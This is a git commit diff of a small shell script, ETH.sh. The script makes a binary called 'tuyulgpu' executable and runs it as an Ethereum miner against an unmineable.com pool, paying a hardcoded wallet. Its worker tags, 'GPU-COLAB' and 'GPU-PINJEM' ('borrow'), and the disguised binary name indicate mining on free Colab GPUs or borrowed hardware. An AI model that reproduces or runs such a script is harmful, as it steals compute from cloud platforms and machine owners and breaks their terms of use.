f5dd452f22fd8105e286c7a0184e4a0e9c343254
angkii <83603708+angkii@users.noreply.github.com>
2021-06-23 21:17:52 +0700

    Update ETH.sh

--- ETH.sh
+++ ETH.sh
@@ -1,11 +1,10 @@
-#!/bin/bash
-
 POOL=ethash.unmineable.com:3333
 
 WALLET=ETH:0xb13f91835c32249e1506da1201e937d666652725
 
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-COLAB)
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
 
 chmod +x tuyulgpu
 
 ./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+
